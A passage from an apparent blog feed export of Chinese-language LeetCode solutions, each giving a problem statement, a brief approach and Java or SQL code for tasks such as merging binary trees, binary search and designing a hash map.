    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个二叉树，想象当你将它们中的一个覆盖到另一个上时，两个二叉树的一些节点便会重叠。</p>
<p>你需要将他们合并为一个新的二叉树。合并的规则是如果两个节点重叠，那么将他们的值相加作为节点合并后的新值，否则<code>不为</code> NULL 的节点将直接作为新二叉树的节点。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: </span><br><span class="line">	Tree 1                     Tree 2                  </span><br><span class="line">          1                         2                             </span><br><span class="line">         &#x2F; \                       &#x2F; \                            </span><br><span class="line">        3   2                     1   3                        </span><br><span class="line">       &#x2F;                           \   \                      </span><br><span class="line">      5                             4   7                  </span><br><span class="line">输出: </span><br><span class="line">合并后的树:</span><br><span class="line">	     3</span><br><span class="line">	    &#x2F; \</span><br><span class="line">	   4   5</span><br><span class="line">	  &#x2F; \   \ </span><br><span class="line">	 5   4   7</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong>合并必须从两个树的根节点开始。</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>递归</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">mergeTrees</span><span class="params">(TreeNode t1, TreeNode t2)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">null</span> != t1 &amp;&amp; <span class="keyword">null</span> != t2) &#123;</span><br><span class="line">			t1.val = t1.val + t2.val;</span><br><span class="line">			t1.left = mergeTrees(t1.left, t2.left);</span><br><span class="line">			t1.right = mergeTrees(t1.right, t2.right);</span><br><span class="line">			<span class="keyword">return</span> t1;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">null</span> != t1 &amp;&amp; <span class="keyword">null</span> == t2) &#123;</span><br><span class="line">			<span class="keyword">return</span> t1;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">null</span> == t1 &amp;&amp; <span class="keyword">null</span> != t2) &#123;</span><br><span class="line">			<span class="keyword">return</span> t2;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>627. 交换工资</title>
    <url>/2018/08/29/LeetCode/leetcode-000627.%20%E4%BA%A4%E6%8D%A2%E5%B7%A5%E8%B5%84/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个 <code>salary</code>表，如下所示，有m=男性 和 f=女性的值 。交换所有的 f 和 m 值(例如，将所有 f 值更改为 m，反之亦然)。要求使用一个更新查询，并且没有中间临时表。<br>例如:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">| id | name | sex | salary |</span><br><span class="line">|----|------|-----|--------|</span><br><span class="line">| 1  | A    | m   | 2500   |</span><br><span class="line">| 2  | B    | f   | 1500   |</span><br><span class="line">| 3  | C    | m   | 5500   |</span><br><span class="line">| 4  | D    | f   | 500    |</span><br></pre></td></tr></table></figure>
<p>运行你所编写的查询语句之后，将会得到以下表:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">| id | name | sex | salary |</span><br><span class="line">|----|------|-----|--------|</span><br><span class="line">| 1  | A    | f   | 2500   |</span><br><span class="line">| 2  | B    | m   | 1500   |</span><br><span class="line">| 3  | C    | f   | 5500   |</span><br><span class="line">| 4  | D    | m   | 500    |</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>无</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Write your MySQL query statement below</span></span><br><span class="line"><span class="keyword">UPDATE</span> salary <span class="keyword">SET</span> sex  = (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> sex = <span class="string">'m'</span> <span class="keyword">THEN</span> <span class="string">'f'</span> <span class="keyword">ELSE</span> <span class="string">'m'</span> <span class="keyword">END</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>620. 有趣的电影</title>
    <url>/2018/08/29/LeetCode/leetcode-000620.%20%E6%9C%89%E8%B6%A3%E7%9A%84%E7%94%B5%E5%BD%B1/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>某城市开了一家新的电影院，吸引了很多人过来看电影。该电影院特别注意用户体验，专门有个 LED显示板做电影推荐，上面公布着影评和相关电影描述。</p>
<p>作为该电影院的信息部主管，您需要编写一个 SQL查询，找出所有影片描述为非 <code>boring</code> (不无聊) 的并且 <strong>id 为奇数</strong> 的影片，结果请按等级 <code>rating</code> 排列。<br>例如，下表 <code>cinema</code>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------+-----------+--------------+-----------+</span><br><span class="line">|   id    | movie     |  description |  rating   |</span><br><span class="line">+---------+-----------+--------------+-----------+</span><br><span class="line">|   1     | War       |   great 3D   |   8.9     |</span><br><span class="line">|   2     | Science   |   fiction    |   8.5     |</span><br><span class="line">|   3     | irish     |   boring     |   6.2     |</span><br><span class="line">|   4     | Ice song  |   Fantacy    |   8.6     |</span><br><span class="line">|   5     | House card|   Interesting|   9.1     |</span><br><span class="line">+---------+-----------+--------------+-----------+</span><br></pre></td></tr></table></figure>
<p>对于上面的例子，则正确的输出是为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------+-----------+--------------+-----------+</span><br><span class="line">|   id    | movie     |  description |  rating   |</span><br><span class="line">+---------+-----------+--------------+-----------+</span><br><span class="line">|   5     | House card|   Interesting|   9.1     |</span><br><span class="line">|   1     | War       |   great 3D   |   8.9     |</span><br><span class="line">+---------+-----------+--------------+-----------+</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>无</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Write your MySQL query statement below</span><br><span class="line">select * from cinema where description != <span class="string">'boring'</span> and id % <span class="number">2</span> = <span class="number">1</span> order by rating desc</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>657. 判断路线成圈</title>
    <url>/2018/08/29/LeetCode/leetcode-000657.%20%E5%88%A4%E6%96%AD%E8%B7%AF%E7%BA%BF%E6%88%90%E5%9C%88/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>初始位置 (0, 0) 处有一个机器人。给出它的一系列动作，判断这个机器人的移动路线是否形成一个圆圈，换言之就是判断它是否会移回到<strong>原来的位置</strong>。</p>
<p>移动顺序由一个字符串表示。每一个动作都是由一个字符来表示的。机器人有效的动作有 <code>R</code>（右），<code>L</code>（左），<code>U</code>（上）和 <code>D</code>（下）。输出应为 true 或 false，表示机器人移动路线是否成圈。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;UD&quot;</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;LL&quot;</span><br><span class="line">输出: false</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>如果机器人要回到原点的话，那么它水平方向上，向左和向右的次数，垂直方向上，向上和向下的次数，一定是一样的。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">judgeCircle</span><span class="params">(String moves)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span>[][] position = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; moves.length();i++) &#123;</span><br><span class="line">			<span class="keyword">switch</span>(moves.charAt(i)) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'U'</span>:</span><br><span class="line">				position[<span class="number">0</span>][<span class="number">0</span>]++;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'D'</span>:</span><br><span class="line">				position[<span class="number">0</span>][<span class="number">1</span>]++;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'L'</span>:</span><br><span class="line">				position[<span class="number">1</span>][<span class="number">0</span>]++;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">'R'</span>:</span><br><span class="line">				position[<span class="number">1</span>][<span class="number">1</span>]++;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> (position[<span class="number">0</span>][<span class="number">0</span>] == position[<span class="number">0</span>][<span class="number">1</span>]) &amp;&amp; (position[<span class="number">1</span>][<span class="number">0</span>] == position[<span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>693. 交替位二进制数</title>
    <url>/2018/08/29/LeetCode/leetcode-000693.%20%E4%BA%A4%E6%9B%BF%E4%BD%8D%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个正整数，检查他是否为交替位二进制数：换句话说，就是他的二进制数相邻的两个位数永不相等。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 5</span><br><span class="line">输出: True</span><br><span class="line">解释:</span><br><span class="line">5的二进制数是: 101</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 7</span><br><span class="line">输出: False</span><br><span class="line">解释:</span><br><span class="line">7的二进制数是: 111</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 11</span><br><span class="line">输出: False</span><br><span class="line">解释:</span><br><span class="line">11的二进制数是: 1011</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: 10</span><br><span class="line">输出: True</span><br><span class="line">解释:</span><br><span class="line">10的二进制数是: 1010</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>将数字转换成二进制字符串，如果相邻的两位相等，则返回false，否则返回true。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasAlternatingBits</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        String s = Integer.toBinaryString(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; s.length() - <span class="number">1</span>;i++) &#123;</span><br><span class="line">        	<span class="keyword">if</span> (s.charAt(i) == s.charAt(i + <span class="number">1</span>)) &#123;</span><br><span class="line">        		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>704. 二分查找</title>
    <url>/2018/08/29/LeetCode/leetcode-000704.%20%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个 <code>n</code> 个元素有序的（升序）整型数组 <code>nums</code> 和一个目标值 <code>target</code>  ，写一个函数搜索 <code>nums</code> 中的 <code>target</code>，如果目标值存在返回下标，否则返回 -1。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: nums &#x3D; [-1,0,3,5,9,12], target &#x3D; 9</span><br><span class="line">输出: 4</span><br><span class="line">解释: 9 出现在 nums 中并且下标为 4</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: nums &#x3D; [-1,0,3,5,9,12], target &#x3D; 2</span><br><span class="line">输出: -1</span><br><span class="line">解释: 2 不存在 nums 中因此返回 -1</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li>你可以假设 <code>nums</code> 中的所有元素是不重复的。</li>
<li><code>n</code> 将在 <code>[1, 10000]</code>之间。</li>
<li><code>nums</code> 的每个元素都将在 <code>[-9999, 9999]</code>之间。</li>
</ol>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>二分查找即可。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> begin = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> end = nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (begin &lt;= end) &#123;</span><br><span class="line">        	<span class="keyword">int</span> mid = (begin + end) / <span class="number">2</span>;</span><br><span class="line">        	<span class="keyword">if</span> (nums[mid] &lt; target) &#123;</span><br><span class="line">        		begin++;</span><br><span class="line">        	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[mid] &gt; target) &#123;</span><br><span class="line">        		end--;</span><br><span class="line">        	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		<span class="keyword">return</span> mid;</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二分查找</tag>
      </tags>
  </entry>
  <entry>
    <title>706. 设计哈希映射</title>
    <url>/2018/08/29/LeetCode/leetcode-000706-%E8%AE%BE%E8%AE%A1%E5%93%88%E5%B8%8C%E6%98%A0%E5%B0%84/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>不使用任何内建的哈希表库设计一个哈希映射</p>
<p>具体地说，你的设计应该包含以下的功能：</p>
<ul>
<li><code>put(key, value)</code>：向哈希映射中插入(键,值)的数值对。如果键对应的值已经存在，更新这个值。</li>
<li><code>get(key)</code>：返回给定的键所对应的值，如果映射中不包含这个键，返回-1。</li>
<li><code>remove(key)</code>：如果映射中存在这个键，删除这个数值对。</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MyHashMap hashMap = <span class="keyword">new</span> MyHashMap();</span><br><span class="line">hashMap.put(<span class="number">1</span>, <span class="number">1</span>);          </span><br><span class="line">hashMap.put(<span class="number">2</span>, <span class="number">2</span>);         </span><br><span class="line">hashMap.get(<span class="number">1</span>);            <span class="comment">// 返回 1</span></span><br><span class="line">hashMap.get(<span class="number">3</span>);            <span class="comment">// 返回 -1 (未找到)</span></span><br><span class="line">hashMap.put(<span class="number">2</span>, <span class="number">1</span>);         <span class="comment">// 更新已有的值</span></span><br><span class="line">hashMap.get(<span class="number">2</span>);            <span class="comment">// 返回 1 </span></span><br><span class="line">hashMap.remove(<span class="number">2</span>);         <span class="comment">// 删除键为2的数据</span></span><br><span class="line">hashMap.get(<span class="number">2</span>);            <span class="comment">// 返回 -1 (未找到)</span></span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<ul>
<li>所有的值都在 <code>[1, 1000000]</code>的范围内。</li>
<li>操作的总数目在<code>[1, 10000]</code>范围内。</li>
<li>不要使用内建的哈希库。</li>
</ul>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>申请一个1000001长度的数组，使用索引作为HashMap的key值，数组对应索引位置上则存储HashMap的value值。数组每个位置的值初始化为-1，清空之后也设置为-1，表示没有该索引为key的值。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHashMap</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span>[] data;</span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyHashMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        data = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">1000001</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">1000001</span>;i++) &#123;</span><br><span class="line">        	data[i] = -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** value will always be positive. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        data[key] = value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Returns the value to which the specified key is mapped, or -1 if this map contains no mapping for the key */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> data[key];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Removes the mapping of the specified value key if this map contains a mapping for the key */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        data[key] = -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyHashMap object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyHashMap obj = new MyHashMap();</span></span><br><span class="line"><span class="comment"> * obj.put(key,value);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj.get(key);</span></span><br><span class="line"><span class="comment"> * obj.remove(key);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>哈希表</tag>
      </tags>
  </entry>
  <entry>
    <title>705. 设计哈希集合</title>
    <url>/2018/08/29/LeetCode/leetcode-000705.%20%E8%AE%BE%E8%AE%A1%E5%93%88%E5%B8%8C%E9%9B%86%E5%90%88/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>不使用任何内建的哈希表库设计一个哈希集合</p>
<p>具体地说，你的设计应该包含以下的功能</p>
<p>· <code>add(value)</code>：向哈希集合中插入一个值。<br>· <code>contains(value)</code> ：返回哈希集合中是否存在这个值。<br>· <code>remove(value)</code>：将给定值从哈希集合中删除。如果哈希集合中没有这个值，什么也不做。<br><strong>示例：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MyHashSet hashSet = <span class="keyword">new</span> MyHashSet();</span><br><span class="line">hashSet.add(<span class="number">1</span>);         </span><br><span class="line">hashSet.add(<span class="number">2</span>);         </span><br><span class="line">hashSet.contains(<span class="number">1</span>);    <span class="comment">// 返回 true</span></span><br><span class="line">hashSet.contains(<span class="number">3</span>);    <span class="comment">// 返回 false (未找到)</span></span><br><span class="line">hashSet.add(<span class="number">2</span>);          </span><br><span class="line">hashSet.contains(<span class="number">2</span>);    <span class="comment">// 返回 true</span></span><br><span class="line">hashSet.remove(<span class="number">2</span>);          </span><br><span class="line">hashSet.contains(<span class="number">2</span>);    <span class="comment">// 返回  false (已经被删除)</span></span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong><br>· 所有的值都在 [1, 1000000]的范围内。<br>· 操作的总数目在[1, 10000]范围内。<br>· 不要使用内建的哈希集合库。</p>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>因为值的范围是确定的，那么，可以申请一个长度为1000001的数组，使用下标作为索引，来保存数据。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHashSet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] data;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyHashSet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        data = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">1000001</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    	data[key] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        data[key] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Returns true if this set did not already contain the specified element */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> data[key] == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyHashSet object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyHashSet obj = new MyHashSet();</span></span><br><span class="line"><span class="comment"> * obj.add(key);</span></span><br><span class="line"><span class="comment"> * obj.remove(key);</span></span><br><span class="line"><span class="comment"> * boolean param_3 = obj.contains(key);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>哈希集合</tag>
      </tags>
  </entry>
  <entry>
    <title>709. 转换成小写字母</title>
    <url>/2018/08/29/LeetCode/leetcode-000709.%20%E8%BD%AC%E6%8D%A2%E6%88%90%E5%B0%8F%E5%86%99%E5%AD%97%E6%AF%8D/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>实现函数 ToLowerCase()，该函数接收一个字符串参数 str，并将该字符串中的大写字母转换成小写字母，之后返回新的字符串。</p>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;Hello&quot;</span><br><span class="line">输出: &quot;hello&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;here&quot;</span><br><span class="line">输出: &quot;here&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;LOVELY&quot;</span><br><span class="line">输出: &quot;lovely&quot;</span><br></pre></td></tr></table></figure>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>之前看过JDK的源码，toLowerCase实现起来好复杂，所以这边偷懒直接调用了库函数。如果题目中字符串只包含ASCII码的话，直接相减就行了。</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toLowerCase</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> str.toLowerCase();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>728. 自除数</title>
    <url>/2018/08/29/LeetCode/leetcode-000728.%20%E8%87%AA%E9%99%A4%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>自除数 是指可以被它包含的每一位数除尽的数。<br>例如，128 是一个自除数，因为 <code>128 % 1 == 0</code>，<code>128 % 2 == 0</code>，<code>128 % 8 == 0</code>。</p>
<p>还有，自除数不允许包含 0 。</p>
<p>给定上边界和下边界数字，输出一个列表，列表的元素是边界（含边界）内所有的自除数。<br><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： </span><br><span class="line">上边界left &#x3D; 1, 下边界right &#x3D; 22</span><br><span class="line">输出： [1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 15, 22]</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<ul>
<li>每个输入参数的边界满足 <code>1 &lt;= left &lt;= right &lt;= 10000</code>。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>暴力</p>
